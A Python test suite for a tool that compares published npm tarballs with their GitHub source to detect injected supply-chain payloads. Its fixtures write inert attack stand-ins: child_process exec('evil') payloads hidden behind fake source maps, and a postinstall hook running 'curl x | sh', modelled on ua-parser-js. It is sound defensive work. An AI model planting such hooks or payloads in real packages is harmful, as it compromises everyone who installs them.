"""Offline tests for backend.deps.drift — npm-tarball vs GitHub source comparison.

Builds small on-disk trees per test (no fetch/network involved) and checks that
each drift classification bucket, its excuse set, and the strong/weak signal
computation behave as documented in backend/deps/drift.py.

Since PR #91, `fetch_source()` extracts both npm and GitHub sources without any
wrapper directory — the returned path already holds package.json etc. directly.
Every fixture here mirrors that: a directory of files plus a sibling
`.complete` marker (never the wrapper-nested layout the drift module handled
before #91).
"""

import json

from backend.deps.drift import compare_sources
from backend.models.dependencies import CapabilityEvidence, CapabilityProfile
from backend.models.enums import CapabilityCategory, PathClass, SourceKind


def _profile(evidence=(), status="ok", **overrides):
    return CapabilityProfile(
        name="pkg",
        version="1.0.0",
        source_kind=SourceKind.NPM_TARBALL,
        evidence=list(evidence),
        status=status,
        **overrides,
    )


def _evidence(file, category, path_class=PathClass.SHIPPED):
    return CapabilityEvidence(
        category=category,
        rule_id="r",
        file=file,
        line=1,
        snippet="x",
        source_kind=SourceKind.NPM_TARBALL,
        path_class=path_class,
    )


def _fetched_dir(tmp_path, label):
    """A fetch_source()-shaped directory (post-#91): files directly inside,
    plus a sibling `.complete` marker."""
    fetch_dir = tmp_path / label
    fetch_dir.mkdir(parents=True)
    (tmp_path / f"{label}.complete").touch()
    return fetch_dir


def test_github_unavailable_skips_comparison(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), None, None)
    assert report.status == "skipped_github_unavailable"
    assert report.signal is False
    assert report.matched == []


def test_scan_incomplete_skips_comparison(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    github_dir = _fetched_dir(tmp_path, "github")
    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, _profile(status="semgrep_timeout"), github_dir, _profile()
    )
    assert report.status == "skipped_scan_incomplete"
    assert report.signal is False


def test_scan_incomplete_on_github_side_also_skips(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    github_dir = _fetched_dir(tmp_path, "github")
    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile(status="semgrep_error")
    )
    assert report.status == "skipped_scan_incomplete"


def test_partial_fetch_status_still_compares(tmp_path):
    """A `partial_fetch` profile (some files couldn't be extracted, e.g.
    Windows path limits) still ran a real scan — only a `semgrep_*` status
    means the scan itself didn't finish."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "index.js").write_text("module.exports = 1;\n")
    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.js").write_text("module.exports = 1;\n")

    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, _profile(status="partial_fetch"), github_dir, _profile()
    )
    assert report.status == "compared"
    assert report.matched == ["index.js"]


def test_matched_file(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "index.js").write_text("module.exports = 1;\n")

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.js").write_text("module.exports = 1;\n")

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert report.matched == ["index.js"]
    assert report.unexplained == []
    assert report.status == "compared"


def test_marker_file_is_not_classified_as_matched(tmp_path):
    """The sibling `.complete` marker (a sibling of the fetch dir, not inside
    it) must never leak into the comparison."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "index.js").write_text("module.exports = 1;\n")
    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.js").write_text("module.exports = 1;\n")

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert ".complete" not in report.matched
    assert ".complete" not in report.unexplained


def test_explained_by_sourcemap(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "index.js").write_text("console.log('compiled')")
    (tarball_dir / "index.js.map").write_text(
        json.dumps({"sources": ["index.ts"], "sourcesContent": []})
    )

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.ts").write_text("console.log('source')")

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert report.explained_by_sourcemap == ["index.js"]
    assert report.unexplained == []


def test_explained_by_sourcemap_standard_tsc_outdir_layout(tmp_path):
    """tsc's usual `outDir: dist` / `rootDir: src` setup emits sources like
    `../src/index.ts` relative to `dist/index.js.map` — the shape the earlier
    `.lstrip("./")` bug destroyed before the ".." resolver ever saw it."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "dist").mkdir()
    (tarball_dir / "dist" / "index.js").write_text("console.log('compiled')")
    (tarball_dir / "dist" / "index.js.map").write_text(json.dumps({"sources": ["../src/index.ts"]}))

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "src").mkdir()
    (github_dir / "src" / "index.ts").write_text("console.log('source')")

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert report.explained_by_sourcemap == ["dist/index.js"]
    assert report.unexplained == []


def test_explained_by_inline_sourcemap_comment(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "index.js").write_bytes(
        b"console.log('compiled')\n//# sourceMappingURL=index.js.map\n"
    )
    (tarball_dir / "index.js.map").write_text(json.dumps({"sources": ["index.ts"]}))

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.ts").write_text("console.log('source')")

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert report.explained_by_sourcemap == ["index.js"]


def test_inline_sourcemap_data_uri_is_not_resolved(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "index.js").write_bytes(
        b"console.log('x')\n//# sourceMappingURL=data:application/json;base64,eyJ9\n"
    )
    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "other.ts").write_text("console.log('x')")

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert report.unexplained == ["index.js"]


def test_bundled_dependency_via_sourcemap_declared_in_github_package_json(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "bundle.js").write_text("console.log('bundled')")
    (tarball_dir / "bundle.js.map").write_text(
        json.dumps({"sources": ["../node_modules/left-pad/index.js"]})
    )

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.js").write_text("// unrelated")
    (github_dir / "package.json").write_text(json.dumps({"dependencies": {"left-pad": "^1.0.0"}}))

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert report.bundled_dependency == ["bundle.js"]
    assert report.unexplained == []


def test_bundled_dependency_via_sourcemap_undeclared_package_is_invalid_map(tmp_path):
    """A source map pointing into `node_modules/<pkg>` for a package the
    GitHub repo never declares as a dependency must NOT be waved through as
    bundled — that's exactly a fake map hiding an injected file."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "bundle.js").write_text("require('child_process').exec('evil')")
    (tarball_dir / "bundle.js.map").write_text(
        json.dumps({"sources": ["../node_modules/not-a-real-dep/index.js"]})
    )

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.js").write_text("// unrelated")
    (github_dir / "package.json").write_text(json.dumps({"dependencies": {}}))

    tarball_profile = _profile([_evidence("bundle.js", CapabilityCategory.PROCESS)])
    report = compare_sources("pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, _profile())
    assert report.bundled_dependency == []
    assert "bundle.js" in report.unexplained
    assert report.signal is True


def test_bundled_dependency_excuse_is_bounded_to_the_packages_own_categories(tmp_path):
    """A declared dependency (nearly every repo has one — devDependencies
    included) named in a fake map must not blanket-excuse a capability the
    package's real GitHub source has never shown anywhere. "bundled" is a
    valid map, but its excuse is the package-wide GitHub category set, not
    every category unconditionally — otherwise naming e.g. "typescript" in a
    bogus map would hide an injected payload one step removed from the
    already-tested undeclared-package case."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "evil.js").write_text("require('child_process').exec('evil')")
    (tarball_dir / "evil.js.map").write_text(
        json.dumps({"sources": ["../node_modules/typescript/lib/tsc.js"]})
    )

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.js").write_text("module.exports = {};")
    (github_dir / "package.json").write_text(
        json.dumps({"devDependencies": {"typescript": "^5.0.0"}})
    )

    tarball_profile = _profile([_evidence("evil.js", CapabilityCategory.PROCESS)])
    github_profile = _profile()  # no process capability anywhere in the real source
    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
    )
    assert report.bundled_dependency == ["evil.js"]
    assert report.signal is True
    assert report.signal_files == {"evil.js": [CapabilityCategory.PROCESS]}


def test_bundled_dependency_excuses_a_category_the_package_already_has(tmp_path):
    """The legitimate case the bound above must not break: a vendor chunk
    bundling a declared dependency is still excused for capabilities the
    package's own GitHub source already shows elsewhere — we don't scan the
    vendor, but we don't need to when the capability isn't actually novel."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "vendor.js").write_text("require('child_process').exec('build step')")
    (tarball_dir / "vendor.js.map").write_text(
        json.dumps({"sources": ["../node_modules/some-lib/index.js"]})
    )

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "build.js").write_text("require('child_process').exec('build step')")
    (github_dir / "package.json").write_text(json.dumps({"dependencies": {"some-lib": "^1.0.0"}}))

    tarball_profile = _profile([_evidence("vendor.js", CapabilityCategory.PROCESS)])
    github_profile = _profile([_evidence("build.js", CapabilityCategory.PROCESS)])
    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
    )
    assert report.bundled_dependency == ["vendor.js"]
    assert report.signal is False


def test_sourcemap_pointing_at_unrelated_real_file_is_invalid_map(tmp_path):
    """A source map whose `sources` entry resolves to a real GitHub file that
    has nothing to do with the payload must not excuse it — every listed
    source has to actually match, or the map is ignored entirely."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "payload.js").write_text("require('child_process').exec('evil')")
    (tarball_dir / "payload.js.map").write_text(json.dumps({"sources": ["unrelated.ts"]}))

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.js").write_text("module.exports = {};")
    # No unrelated.ts on the GitHub side at all -> the map is invalid.

    tarball_profile = _profile([_evidence("payload.js", CapabilityCategory.PROCESS)])
    report = compare_sources("pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, _profile())
    assert report.explained_by_sourcemap == []
    assert "payload.js" in report.unexplained
    assert report.signal is True


def test_explained_by_build_dts(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "index.d.ts").write_text("export {};")

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.ts").write_text("export {};")

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert report.explained_by_build == ["index.d.ts"]
    assert report.unexplained == []


def test_explained_by_build_ts_compiled_pair(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "index.js").write_text("//compiled")

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.ts").write_text("//source")

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert report.explained_by_build == ["index.js"]


def test_explained_by_build_declared_dist_dir_with_build_script(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "dist").mkdir()
    (tarball_dir / "dist" / "index.js").write_text("//compiled bundle, no ts pair")
    (tarball_dir / "package.json").write_text(
        json.dumps({"main": "dist/index.js", "scripts": {"build": "tsc"}})
    )

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "src.js").write_text("// unrelated, no dist here")
    (github_dir / "package.json").write_text(json.dumps({"scripts": {"build": "tsc"}}))

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert "dist/index.js" in report.explained_by_build


def test_explained_by_build_leading_dot_slash_main_and_bare_files_entry(tmp_path):
    """The common real-world TypeScript package shape: "main": "./dist/index.js"
    (leading "./") and "files": ["dist"] (no slash at all) — both forms must
    still resolve to "dist" as a declared build directory, or a normal
    package with no source maps gets every dist/ file marked unexplained."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "dist").mkdir()
    (tarball_dir / "dist" / "index.js").write_text("//compiled bundle, no ts pair, no map")
    (tarball_dir / "package.json").write_text(
        json.dumps({"main": "./dist/index.js", "files": ["dist"], "scripts": {"build": "tsc"}})
    )

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "src.ts").write_text("// unrelated, no dist here")
    (github_dir / "package.json").write_text(json.dumps({"scripts": {"build": "tsc"}}))

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert "dist/index.js" in report.explained_by_build
    assert "dist/index.js" not in report.unexplained


def test_explained_by_build_via_exports_field(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "dist").mkdir()
    (tarball_dir / "dist" / "index.mjs").write_text("//compiled esm bundle")
    (tarball_dir / "package.json").write_text(
        json.dumps(
            {
                "exports": {".": {"import": "./dist/index.mjs", "require": "./dist/index.cjs"}},
                "scripts": {"prepare": "tsc"},
            }
        )
    )

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "src.ts").write_text("// unrelated, no dist here")
    (github_dir / "package.json").write_text(json.dumps({"scripts": {"prepare": "tsc"}}))

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert "dist/index.mjs" in report.explained_by_build


def test_build_dir_not_declared_stays_unexplained(tmp_path):
    """A conventionally-named directory (lib/) that package.json never
    declares as its build output (main/module/types/files) must not be
    explained away just because *some* build script exists — otherwise an
    injected file dropped into a source-carrying lib/ directory is hidden."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "lib").mkdir()
    (tarball_dir / "lib" / "evil.js").write_text("require('child_process').exec('x')")
    (tarball_dir / "package.json").write_text(
        json.dumps({"main": "index.js", "scripts": {"build": "webpack --config docs.config.js"}})
    )

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.js").write_text("module.exports = {};")

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert "lib/evil.js" in report.unexplained
    assert "lib/evil.js" not in report.explained_by_build


def test_unexplained_without_build_script(tmp_path):
    """The same dist/ layout, but no build script declared — no longer explained."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "dist").mkdir()
    (tarball_dir / "dist" / "index.js").write_text("//mystery file")
    (tarball_dir / "package.json").write_text(json.dumps({"main": "dist/index.js"}))

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "readme.md").write_text("nothing relevant")

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert "dist/index.js" in report.unexplained


def test_signal_true_for_unexplained_file_with_novel_category(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "payload.js").write_text("require('child_process').exec('evil')")

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.js").write_text("module.exports = {};")

    tarball_profile = _profile([_evidence("payload.js", CapabilityCategory.PROCESS)])
    github_profile = _profile()  # no process capability anywhere in the GitHub scan

    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
    )
    assert report.unexplained == ["payload.js"]
    assert report.signal is True
    assert report.signal_categories == [CapabilityCategory.PROCESS]
    assert report.signal_files == {"payload.js": [CapabilityCategory.PROCESS]}


def test_signal_false_when_category_also_present_on_github(tmp_path):
    """A benign refactor: the tarball has an unexplained file, but its capability
    category is already present in the GitHub-scanned source elsewhere — no
    strong signal, but it's reported as informational (relocated)."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "generated.js").write_text("require('child_process').exec('build step')")

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "build.js").write_text("require('child_process').exec('build step')")

    tarball_profile = _profile([_evidence("generated.js", CapabilityCategory.PROCESS)])
    github_profile = _profile([_evidence("build.js", CapabilityCategory.PROCESS)])

    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
    )
    assert report.unexplained == ["generated.js"]
    assert report.signal is False
    assert report.signal_categories == []
    assert report.relocated == [
        {"file": "generated.js", "categories": [CapabilityCategory.PROCESS]}
    ]


def test_signal_false_when_unexplained_file_has_no_evidence(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "notes.txt").write_text("just some notes, no capability")

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.js").write_text("module.exports = {};")

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert report.unexplained == ["notes.txt"]
    assert report.signal is False


def test_node_modules_excluded_from_both_trees(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "node_modules" / "left-pad").mkdir(parents=True)
    (tarball_dir / "node_modules" / "left-pad" / "index.js").write_text("vendored")
    (tarball_dir / "index.js").write_text("module.exports = {};")

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.js").write_text("module.exports = {};")

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert report.matched == ["index.js"]
    assert report.unexplained == []


def test_single_subfolder_package_dir_is_not_collapsed(tmp_path):
    """A package whose only content is one subdirectory (e.g. `src/`) plus
    dotfiles must be addressed by its real relative path, `src/index.js` —
    never collapsed to `index.js`. This is the shape the pre-#91
    `content_root()` defensive collapse (deleted in PR C, since real fetches
    are unwrapped) would have mishandled; both `tarball_dir` and `github_dir`
    are used directly with no such collapse anywhere in this module."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "src").mkdir()
    (tarball_dir / "src" / "index.js").write_text("module.exports = {};")

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "src").mkdir()
    (github_dir / "src" / "index.js").write_text("module.exports = {};")

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert report.matched == ["src/index.js"]
    assert "index.js" not in report.matched
    assert report.unexplained == []


def test_build_script_read_from_github_not_tarball(tmp_path):
    """The attacker controls the published tarball's package.json — a build
    script declared only there must not make anything self-certify."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "dist").mkdir()
    (tarball_dir / "dist" / "index.js").write_text("//compiled, no ts pair")
    (tarball_dir / "package.json").write_text(
        json.dumps({"main": "dist/index.js", "scripts": {"build": "tsc"}})
    )

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "readme.md").write_text("n/a")
    # No package.json / build script in the actual repo.

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert "dist/index.js" in report.unexplained
    assert "dist/index.js" not in report.explained_by_build


def test_root_level_file_not_explained_by_bare_files_entry(tmp_path):
    """A root-level injected file must not be waved through just because its
    bare name matches a "files" entry or "main" — the build-folder rule only
    covers files *inside* a declared directory (the event-stream shape)."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "index.js").write_text("module.exports = {};")
    (tarball_dir / "payload.js").write_text("require('child_process').exec('evil')")
    (tarball_dir / "package.json").write_text(
        json.dumps({"files": ["index.js", "payload.js"], "scripts": {"build": "tsc"}})
    )

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.js").write_text("module.exports = {};")
    (github_dir / "package.json").write_text(json.dumps({"scripts": {"build": "tsc"}}))

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert "payload.js" in report.unexplained
    assert "payload.js" not in report.explained_by_build


def test_matched_file_with_novel_category_is_strong_signal(tmp_path):
    """A payload appended to an otherwise-matched file: same path on both
    sides, but the tarball copy carries a capability the GitHub copy — and
    the whole GitHub scan — never shows. Provenance (it's "matched") must not
    excuse a category the matched file itself never had."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "index.js").write_text(
        "module.exports = {}; require('child_process').exec('x');"
    )

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.js").write_text("module.exports = {};")

    tarball_profile = _profile([_evidence("index.js", CapabilityCategory.PROCESS)])
    report = compare_sources("pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, _profile())
    assert report.matched == ["index.js"]
    assert report.signal is True
    assert report.signal_files == {"index.js": [CapabilityCategory.PROCESS]}


def test_matched_file_new_evidence_same_category_is_weak_and_informational(tmp_path):
    """The matched file gains a *second* instance of a category it already
    had elsewhere in the GitHub scan — not a strong signal, but surfaced as
    both `relocated` (category-level) and `new_evidence_in_matched`
    (evidence-level, so the new line is visible even though the category
    itself isn't novel)."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "index.js").write_text("require('child_process').exec('a'); exec('b');")

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.js").write_text("require('child_process').exec('a');")
    (github_dir / "build.js").write_text("require('child_process').exec('elsewhere');")

    tarball_profile = _profile(
        [
            _evidence("index.js", CapabilityCategory.PROCESS),
        ]
    )
    github_profile = _profile(
        [
            CapabilityEvidence(
                category=CapabilityCategory.PROCESS,
                rule_id="r",
                file="index.js",
                line=1,
                snippet="different-snippet",
                source_kind=SourceKind.GITHUB,
                path_class=PathClass.SHIPPED,
            ),
            _evidence("build.js", CapabilityCategory.PROCESS, path_class=PathClass.SHIPPED),
        ]
    )
    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
    )
    assert report.matched == ["index.js"]
    assert report.signal is False
    assert "index.js" in report.new_evidence_in_matched


def test_unverifiable_bucket_for_github_skipped_symlink(tmp_path):
    """A tarball-only file whose exact path is one GitHub couldn't extract
    (recorded as a skipped symlink) must never be treated as a drift
    signal — GitHub not having scanned it isn't the same as GitHub's real
    source not having it."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "vendored.js").write_text("require('child_process').exec('evil')")

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.js").write_text("module.exports = {};")

    tarball_profile = _profile([_evidence("vendored.js", CapabilityCategory.PROCESS)])
    github_profile = _profile(skipped_link_names=["vendored.js"])
    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
    )
    assert report.unverifiable == ["vendored.js"]
    assert "vendored.js" not in report.unexplained
    assert report.signal is False


def test_unverifiable_bucket_for_a_named_skipped_long_path(tmp_path):
    """A tarball-only file whose exact path GitHub's fetch recorded as
    skipped-for-length (`skipped_long_path_names`) is `unverifiable`, matched
    by exact name — never recomputed against the final cache path. The
    fetcher's proactive length check actually runs against a longer temporary
    staging path (a `tempfile.mkdtemp()` directory plus an `extracted/`
    segment) that is later moved into place, so a name-based match is the
    only way to get the right answer for a path in the gap between the two
    lengths; recomputing the check against the shorter final path here would
    wrongly call it verifiable."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "payload.js").write_text("require('child_process').exec('evil')")

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.js").write_text("module.exports = {};")

    tarball_profile = _profile([_evidence("payload.js", CapabilityCategory.PROCESS)])
    github_profile = _profile(
        status="partial_fetch", skipped_long_paths=1, skipped_long_path_names=["payload.js"]
    )
    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
    )
    assert report.unverifiable == ["payload.js"]
    assert report.unexplained == []
    assert report.signal is False


def test_short_unexplained_path_is_not_downgraded_by_an_unrelated_long_path_skip(tmp_path):
    """A GitHub `partial_fetch` from one deep, unrelated fixture elsewhere in
    the repo (recorded by its own exact name) must not blind drift to a
    short, unrelated payload path that GitHub plainly never had a problem
    with — matching by exact name, not by a package-wide "something was
    skipped" flag, is what keeps these two independent."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "payload.js").write_text("require('child_process').exec('evil')")

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.js").write_text("module.exports = {};")

    tarball_profile = _profile([_evidence("payload.js", CapabilityCategory.PROCESS)])
    github_profile = _profile(
        status="partial_fetch",
        skipped_long_paths=1,
        skipped_long_path_names=["some/unrelated/deep/fixture.js"],
    )
    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
    )
    assert report.unverifiable == []
    assert report.unexplained == ["payload.js"]
    assert report.signal is True


def test_install_hook_added_in_tarball_is_strong_signal(tmp_path):
    """The ua-parser-js shape: a postinstall hook the tarball's package.json
    declares that the actual GitHub repo's package.json never had — caught
    without needing a previous published version to diff against."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "package.json").write_text(
        json.dumps({"scripts": {"postinstall": "node scripts/setup.js"}})
    )
    (tarball_dir / "scripts").mkdir()
    (tarball_dir / "scripts" / "setup.js").write_text(
        "require('child_process').exec('curl x | sh')"
    )

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "package.json").write_text(json.dumps({"scripts": {}}))

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert report.install_hooks_added == ["postinstall"]
    assert report.signal is True
    assert CapabilityCategory.BUILD_INSTALL in report.signal_files["package.json"]


def test_install_hook_unchanged_is_not_flagged(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "package.json").write_text(
        json.dumps({"scripts": {"postinstall": "husky install"}})
    )
    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "package.json").write_text(
        json.dumps({"scripts": {"postinstall": "husky install"}})
    )

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert report.install_hooks_added == []
    assert report.signal is False
